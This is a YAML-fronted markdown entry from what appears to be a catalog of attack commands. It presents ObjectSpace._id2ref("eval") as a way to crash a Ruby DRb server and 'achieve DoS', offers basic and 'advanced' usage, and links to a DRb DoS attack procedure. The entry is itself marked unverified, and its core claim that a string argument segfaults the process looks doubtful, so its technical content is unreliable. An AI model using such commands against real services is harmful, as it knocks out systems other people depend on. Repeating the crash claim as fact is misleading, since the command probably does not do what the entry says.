---
id: cmd-drb-crash-001
data: ObjectSpace._id2ref("eval")
tags:
  - dos
  - crash
  - deserialization
type: command
output: 'Core dump or segmentation fault at lib/drb/drb.rb:366'
executor: ruby
platforms:
  - Linux
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.168Z'
verified: false
validated: true
submitted: true
---
# Trigger-DRb-Crash-with-Invalid-Object-Reference

## Command

```ruby
ObjectSpace._id2ref("eval")
```

## Description

This Ruby command attempts to convert an invalid string reference ('eval') to an object using ObjectSpace._id2ref, which is invoked internally during DRb message deserialization. When passed non-integer input, it causes a segmentation fault, crashing the DRb server. Use in fuzzing contexts to exploit the lack of validation in DRb protocol handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ref` | The reference to convert to object (must be integer ID; strings like 'eval' trigger crash) | Yes |

## Examples

### Basic Usage

```ruby
ObjectSpace._id2ref("eval")
```

### Advanced Usage

```ruby
# In DRb context, simulate via malformed request
require 'drb'
# Craft payload to pass 'eval' as ref in recv_request
ObjectSpace._id2ref('invalid_string')
```

## Expected Output

A core dump or segmentation fault error, e.g., "Segmentation fault (core dumped)" with backtrace pointing to lib/drb/drb.rb:366. The DRb server process terminates, achieving DoS.

## Related

- [[Related Procedure: Execute-DRb-DoS-Attack]]
